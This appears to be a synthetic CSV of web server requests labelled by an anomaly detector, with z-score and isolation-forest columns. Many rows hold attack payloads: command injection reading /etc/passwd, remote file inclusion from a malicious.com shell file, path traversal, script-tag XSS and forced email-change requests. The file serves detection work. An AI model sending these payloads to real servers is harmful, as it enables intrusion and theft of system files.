ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
174.170.48.242,2025-03-15 12:15:33,POST /change-email?email=attacker@example.com HTTP/1.1,403,2951,0.16033739614616796,False,54,403,True,True
61.225.65.123,2025-03-15 12:15:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1782,-0.7372467526410229,False,60,200,True,True
98.190.187.222,2025-03-15 12:15:01,GET /admin HTTP/1.1,403,4827,1.6007718385112406,False,19,403,True,True
168.56.119.143,2025-03-15 12:15:01,POST /upload-xml HTTP/1.1,403,4907,1.6621976143050605,False,25,403,True,True
68.75.204.29,2025-03-15 12:15:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4280,1.1807730965209984,False,47,200,True,True
226.220.55.228,2025-03-15 12:15:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3682,0.7216154224621958,False,60,200,True,True
204.84.176.42,2025-03-15 12:14:50,POST /change-email?email=attacker@example.com HTTP/1.1,403,1506,-0.949165679129701,False,54,403,True,True
162.91.195.135,2025-03-15 12:15:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4625,1.4456717546318458,False,47,200,True,True
12.154.28.191,2025-03-15 12:15:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4829,1.6023074829060862,False,59,200,True,True
129.139.58.39,2025-03-15 12:15:36,POST /upload-xml HTTP/1.1,403,597,-1.6471160565869776,False,25,403,True,True
239.186.76.84,2025-03-15 12:14:52,POST /change-email?email=attacker@example.com HTTP/1.1,403,4091,1.0356547012080992,False,54,403,True,True
99.226.216.217,2025-03-15 12:15:34,POST /change-email?email=attacker@example.com HTTP/1.1,403,587,-1.654794278561205,False,54,403,True,True
180.132.201.78,2025-03-15 12:14:58,POST /change-email?email=attacker@example.com HTTP/1.1,403,3212,0.3607389896735049,False,54,403,True,True
29.46.233.108,2025-03-15 12:15:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1081,-1.2754901130343683,False,60,200,True,True
3.7.140.57,2025-03-15 12:14:46,POST /change-email?email=attacker@example.com HTTP/1.1,403,1791,-0.7303363528642182,False,54,403,True,True
15.137.214.217,2025-03-15 12:15:34,POST /upload-xml HTTP/1.1,403,4869,1.633020370802996,False,25,403,True,True
240.39.212.104,2025-03-15 12:15:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1006,-1.3330767778410744,False,51,403,True,True
203.157.33.229,2025-03-15 12:14:59,POST /change-email?email=attacker@example.com HTTP/1.1,403,3316,0.4405924982054705,False,54,403,True,True
214.93.147.111,2025-03-15 12:15:11,POST /change-email?email=attacker@example.com HTTP/1.1,403,2296,-0.3425861431657311,False,54,403,True,True
83.173.208.96,2025-03-15 12:15:38,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,906,-1.4098589975833489,False,59,200,True,True
1.103.131.92,2025-03-15 12:15:24,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4887,1.6468411703566055,False,59,200,True,True
192.89.124.73,2025-03-15 12:15:23,GET /api/user?username=admin HTTP/1.1,403,4706,1.5078653526230883,False,37,403,True,True
140.235.36.52,2025-03-15 12:14:51,POST /change-email?email=attacker@example.com HTTP/1.1,403,1286,-1.1180865625627052,False,54,403,True,True
77.146.105.109,2025-03-15 12:15:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4899,1.6560550367256786,False,47,200,True,True
106.208.176.111,2025-03-15 12:15:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3983,0.9527299038864425,False,47,200,True,True
144.176.129.96,2025-03-15 12:14:47,GET /etc/passwd HTTP/1.1,403,4955,1.6990530797813523,False,24,403,True,True
197.161.162.208,2025-03-15 12:15:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3933,0.9143387940153052,False,47,200,True,True
189.231.32.45,2025-03-15 12:15:34,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4999,1.732837256467953,False,47,200,True,True
103.212.81.105,2025-03-15 12:15:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,667,-1.5933685027673854,False,60,200,True,True
200.52.221.166,2025-03-15 12:15:18,GET /admin HTTP/1.1,403,801,-1.4904803283127372,False,19,403,True,True
103.125.65.92,2025-03-15 12:14:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4992,1.7274625010859939,False,47,200,True,True
221.121.157.83,2025-03-15 12:15:08,POST /change-email?email=attacker@example.com HTTP/1.1,403,4069,1.0187626128647986,False,54,403,True,True
145.180.91.235,2025-03-15 12:15:21,GET /admin HTTP/1.1,403,667,-1.5933685027673854,False,19,403,True,True
26.243.212.70,2025-03-15 12:15:41,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1018,-1.3238629114720013,False,59,200,True,True
212.123.115.67,2025-03-15 12:15:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3434,0.5311955175013546,False,60,200,True,True
132.61.229.214,2025-03-15 12:15:20,POST /change-email?email=attacker@example.com HTTP/1.1,403,545,-1.6870428108529605,False,54,403,True,True
118.18.212.83,2025-03-15 12:15:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4712,1.5124722858076247,False,51,403,True,True
92.49.82.19,2025-03-15 12:16:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3236,0.3791667224116508,False,60,200,True,True
99.90.8.25,2025-03-15 12:16:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1387,-1.0405365206230077,False,60,200,True,True
107.40.245.111,2025-03-15 12:16:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4648,1.463331665172569,False,60,200,True,True
67.178.164.167,2025-03-15 12:16:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4859,1.6253421488287685,False,60,200,True,True
162.39.168.250,2025-03-15 12:16:47,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4375,1.2537162052761592,False,51,403,True,True
40.148.33.47,2025-03-15 12:17:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3191,0.3446147235276272,False,60,200,True,True
205.205.167.70,2025-03-15 12:16:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,952,-1.3745391765019026,False,60,200,True,True
226.129.131.249,2025-03-15 12:16:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1244,-1.1503350948544606,False,60,200,True,True
156.155.56.100,2025-03-15 12:16:43,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4328,1.2176285619972902,False,51,403,True,True
63.125.117.212,2025-03-15 12:17:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,981,-1.3522723327766428,False,59,200,True,True
32.68.245.55,2025-03-15 12:16:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1241,-1.1526385614467287,False,60,200,True,True
57.40.210.87,2025-03-15 12:16:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,983,-1.3507366883817975,False,51,403,True,True
118.218.133.168,2025-03-15 12:16:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4803,1.5823441057730947,False,60,200,True,True
113.246.84.100,2025-03-15 12:16:44,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4399,1.2721439380143051,False,59,200,True,True
32.116.174.237,2025-03-15 12:16:24,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,691,-1.5749407700292395,False,47,403,True,True
99.66.54.212,2025-03-15 12:17:00,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4581,1.411887577945245,False,47,403,True,True
110.80.26.242,2025-03-15 12:16:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4749,1.5408817071122665,False,60,200,True,True
43.182.171.61,2025-03-15 12:16:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,935,-1.3875921538580893,False,60,200,True,True
36.103.153.3,2025-03-15 12:17:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4936,1.68446445803032,False,51,403,True,True
115.241.156.25,2025-03-15 12:16:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4937,1.6852322802277429,False,51,403,True,True
190.192.176.106,2025-03-15 12:16:45,POST /change-email?email=attacker@example.com HTTP/1.1,200,814,-1.4804986397462416,False,54,200,True,True
156.66.13.87,2025-03-15 12:16:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4772,1.5585416176529896,False,60,200,True,True
254.115.9.106,2025-03-15 12:16:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4768,1.5554703288632987,False,60,200,True,True
86.16.248.97,2025-03-15 12:16:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,814,-1.4804986397462416,False,59,200,True,True
161.78.97.32,2025-03-15 12:16:48,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4344,1.2299137171560541,False,51,403,True,True
120.114.76.248,2025-03-15 12:17:18,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4892,1.6506802813437191,False,59,200,True,True
172.138.16.52,2025-03-15 12:17:20,POST /change-email?email=attacker@example.com HTTP/1.1,200,4614,1.4372257104601958,False,54,200,True,True
5.125.104.166,2025-03-15 12:16:52,POST /change-email?email=attacker@example.com HTTP/1.1,200,4789,1.5715945950091763,False,54,200,True,True
54.93.103.240,2025-03-15 12:17:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1634,-0.8508844378595893,False,60,200,True,True
140.63.149.168,2025-03-15 12:16:58,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4906,1.6614297921076377,False,59,200,True,True
210.227.5.157,2025-03-15 12:16:30,POST /change-email?email=attacker@example.com HTTP/1.1,200,4188,1.1101334543581056,False,54,200,True,True
222.59.47.196,2025-03-15 12:16:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1753,-0.7595135963662825,False,60,200,True,True
237.134.68.174,2025-03-15 12:17:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3208,0.3576677008838139,False,60,200,True,True
59.180.4.48,2025-03-15 12:16:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4997,1.7313016120731075,False,47,403,True,True
62.241.50.241,2025-03-15 12:17:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,904,-1.4113946419781944,False,59,200,True,True
11.199.149.219,2025-03-15 12:17:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4558,1.3942276674045218,False,60,200,True,True
71.71.199.56,2025-03-15 12:17:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4566,1.4003702449839037,False,60,200,True,True
31.25.103.227,2025-03-15 12:17:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,712,-1.5588165038833617,False,60,200,True,True
166.206.76.192,2025-03-15 12:17:09,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,650,-1.606421480123572,False,51,403,True,True
228.243.135.161,2025-03-15 12:16:41,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,624,-1.6263848572565636,False,47,403,True,True
30.179.225.242,2025-03-15 12:17:29,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4966,1.7074991239530024,False,47,403,True,True
45.36.156.59,2025-03-15 12:17:14,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4395,1.269072649224614,False,47,403,True,True
139.32.211.137,2025-03-15 12:16:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1242,-1.1518707392493062,False,60,200,True,True
28.66.90.92,2025-03-15 12:17:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,867,-1.439804063282836,False,47,403,True,True
27.65.176.249,2025-03-15 12:16:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,4891,1.6499124591462966,False,54,200,True,True
20.237.102.71,2025-03-15 12:17:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4483,1.336641002597816,False,60,200,True,True
4.230.87.118,2025-03-15 12:17:12,POST /change-email?email=attacker@example.com HTTP/1.1,200,957,-1.370700065514789,False,54,200,True,True
228.28.90.18,2025-03-15 12:17:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,915,-1.4029485978065441,False,60,200,True,True
171.1.1.242,2025-03-15 12:17:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4064,1.014923501877685,False,60,200,True,True
137.204.69.252,2025-03-15 12:17:09,POST /change-email?email=attacker@example.com HTTP/1.1,200,989,-1.3461297551972609,False,54,200,True,True
62.109.149.146,2025-03-15 12:17:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4701,1.5040262416359746,False,51,403,True,True
62.133.126.16,2025-03-15 12:17:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,600,-1.6448125899947095,False,47,403,True,True
165.196.235.231,2025-03-15 12:17:04,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,957,-1.370700065514789,False,51,403,True,True
162.104.208.23,2025-03-15 12:16:40,POST /change-email?email=attacker@example.com HTTP/1.1,200,4843,1.6130569936700045,False,54,200,True,True
9.174.103.167,2025-03-15 12:17:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,841,-1.4597674404158274,False,59,200,True,True
32.34.252.9,2025-03-15 12:17:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4616,1.438761354855041,False,59,200,True,True
168.143.105.217,2025-03-15 12:17:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3787,0.8022367531915842,False,60,200,True,True
116.199.254.55,2025-03-15 12:17:19,POST /change-email?email=attacker@example.com HTTP/1.1,200,1010,-1.3300054890513833,False,54,200,True,True
169.72.79.184,2025-03-15 12:17:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1233,-1.1587811390261107,False,59,200,True,True
145.196.255.197,2025-03-15 12:16:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4464,1.3220523808467837,False,60,200,True,True
206.29.252.147,2025-03-15 12:16:52,POST /change-email?email=attacker@example.com HTTP/1.1,200,4490,1.3420157579797751,False,54,200,True,True
30.67.58.177,2025-03-15 12:17:06,POST /change-email?email=attacker@example.com HTTP/1.1,200,4081,1.0279764792338717,False,54,200,True,True
6.17.68.203,2025-03-15 12:17:30,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4969,1.7098025905452707,False,47,403,True,True
111.125.166.126,2025-03-15 12:16:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1098,-1.2624371356781816,False,59,200,True,True
250.122.224.110,2025-03-15 12:17:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4096,1.0394938121952129,False,60,200,True,True
195.60.39.164,2025-03-15 12:17:47,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4686,1.4925089086746335,False,51,403,True,True
202.45.88.69,2025-03-15 12:17:25,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4502,1.351229624348848,False,51,403,True,True
169.247.109.243,2025-03-15 12:17:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3825,0.8314139966936486,False,60,200,True,True
229.139.13.97,2025-03-15 12:17:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1051,-1.2985247789570507,False,60,200,True,True
131.112.1.197,2025-03-15 12:17:01,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4434,1.2990177149241013,False,47,403,True,True
51.244.140.53,2025-03-15 12:17:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4876,1.6383951261849552,False,59,200,True,True
183.115.14.215,2025-03-15 12:17:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,4264,1.1684879413622342,False,54,200,True,True
85.78.17.62,2025-03-15 12:17:58,POST /login HTTP/1.1,401,4994,1.7289981454808394,False,20,401,True,True
65.249.198.183,2025-03-15 12:17:35,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4673,1.4825272201081376,False,59,200,True,True
234.111.217.176,2025-03-15 12:17:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1032,-1.313113400708083,False,60,200,True,True
35.5.135.178,2025-03-15 12:17:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,580,-1.6601690339431643,False,54,200,True,True
82.31.191.16,2025-03-15 12:17:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1614,-0.8662408818080443,False,60,200,True,True
11.47.233.187,2025-03-15 12:17:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3959,0.9343021711482966,False,60,200,True,True
108.94.114.177,2025-03-15 12:17:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3748,0.7722916874920971,False,60,200,True,True
62.46.141.38,2025-03-15 12:17:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3586,0.647904491509612,False,60,200,True,True
68.33.134.51,2025-03-15 12:17:06,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4865,1.6299490820133051,False,51,403,True,True
218.116.180.73,2025-03-15 12:17:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4226,1.13931069786017,False,60,200,True,True
141.15.94.109,2025-03-15 12:17:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,848,-1.4543926850338682,False,47,403,True,True
227.202.233.150,2025-03-15 12:17:28,POST /change-email?email=attacker@example.com HTTP/1.1,200,3933,0.9143387940153052,False,54,200,True,True
183.242.202.209,2025-03-15 12:17:54,POST /change-email?email=attacker@example.com HTTP/1.1,200,836,-1.4636065514029413,False,54,200,True,True
34.0.209.126,2025-03-15 12:17:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1501,-0.9530047901168147,False,60,200,True,True
161.211.23.183,2025-03-15 12:17:33,POST /login HTTP/1.1,401,4998,1.7320694342705303,False,20,401,True,True
139.204.87.237,2025-03-15 12:17:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1093,-1.2662762466652953,False,60,200,True,True
252.114.28.14,2025-03-15 12:17:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1506,-0.949165679129701,False,60,200,True,True
162.196.34.73,2025-03-15 12:17:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1093,-1.2662762466652953,False,59,200,True,True
4.212.146.60,2025-03-15 12:17:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4563,1.3980667783916356,False,47,403,True,True
114.21.60.182,2025-03-15 12:17:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,525,-1.7023992548014153,False,47,403,True,True
157.120.48.54,2025-03-15 12:17:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4293,1.190754785087494,False,60,200,True,True
190.28.176.22,2025-03-15 12:17:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4876,1.6383951261849552,False,59,200,True,True
10.43.17.244,2025-03-15 12:17:25,POST /change-email?email=attacker@example.com HTTP/1.1,200,4775,1.560845084245258,False,54,200,True,True
11.102.80.177,2025-03-15 12:17:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3780,0.796861997809625,False,60,200,True,True
23.246.188.249,2025-03-15 12:17:22,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4467,1.324355847439052,False,47,403,True,True
118.37.147.37,2025-03-15 12:17:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1255,-1.1418890506828103,False,60,200,True,True
48.32.126.140,2025-03-15 12:18:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2949,0.15880175175132247,False,60,200,True,True
192.219.229.147,2025-03-15 12:17:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1010,-1.3300054890513833,False,51,403,True,True
129.104.253.105,2025-03-15 12:17:30,POST /change-email?email=attacker@example.com HTTP/1.1,200,4199,1.1185794985297557,False,54,200,True,True
175.48.236.122,2025-03-15 12:18:07,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4685,1.4917410864772107,False,51,403,True,True
131.46.142.69,2025-03-15 12:17:22,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,693,-1.573405125634394,False,51,403,True,True
65.62.205.88,2025-03-15 12:17:42,POST /change-email?email=attacker@example.com HTTP/1.1,200,1073,-1.2816326906137503,False,54,200,True,True
164.70.123.25,2025-03-15 12:17:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1050,-1.2992926011544734,False,60,200,True,True
157.202.245.196,2025-03-15 12:18:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1689,-0.8086542170013383,False,60,200,True,True
41.249.169.217,2025-03-15 12:18:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4853,1.620735215644232,False,59,200,True,True
188.230.120.194,2025-03-15 12:17:46,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,676,-1.5864581029905807,False,47,403,True,True
105.182.163.130,2025-03-15 12:17:23,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4639,1.4564212653957642,False,51,403,True,True
177.249.94.35,2025-03-15 12:18:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4492,1.3435514023746205,False,51,403,True,True
183.104.101.61,2025-03-15 12:17:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4741,1.5347391295328845,False,47,403,True,True
247.253.153.241,2025-03-15 12:17:28,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1228,-1.1626202500132246,False,59,200,True,True
60.145.200.251,2025-03-15 12:17:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4613,1.436457888262773,False,51,403,True,True
21.207.107.12,2025-03-15 12:17:34,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4378,1.2560196718684273,False,51,403,True,True
238.117.125.45,2025-03-15 12:17:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4832,1.6046109494983545,False,59,200,True,True
104.18.23.242,2025-03-15 12:18:07,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4623,1.4441361102370003,False,51,403,True,True
73.244.97.253,2025-03-15 12:18:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3892,0.8828580839209725,False,60,200,True,True
206.63.235.243,2025-03-15 12:17:39,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1209,-1.1772088717642566,False,51,403,True,True
101.189.186.144,2025-03-15 12:18:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4428,1.2944107817395647,False,59,200,True,True
158.148.13.241,2025-03-15 12:17:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,857,-1.4474822852570635,False,60,200,True,True
226.116.28.218,2025-03-15 12:17:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3471,0.5596049388059963,False,60,200,True,True
210.154.92.203,2025-03-15 12:17:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,734,-1.5419244155400613,False,47,403,True,True
27.57.180.82,2025-03-15 12:17:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3916,0.9012858166591184,False,60,200,True,True
103.185.55.23,2025-03-15 12:18:26,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4808,1.5861832167602086,False,59,200,True,True
123.9.198.177,2025-03-15 12:17:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3370,0.4820548968662988,False,60,200,True,True
255.187.74.70,2025-03-15 12:17:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,572,-1.6663116115225463,False,59,200,True,True
89.73.117.84,2025-03-15 12:17:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3888,0.8797867951312816,False,60,200,True,True
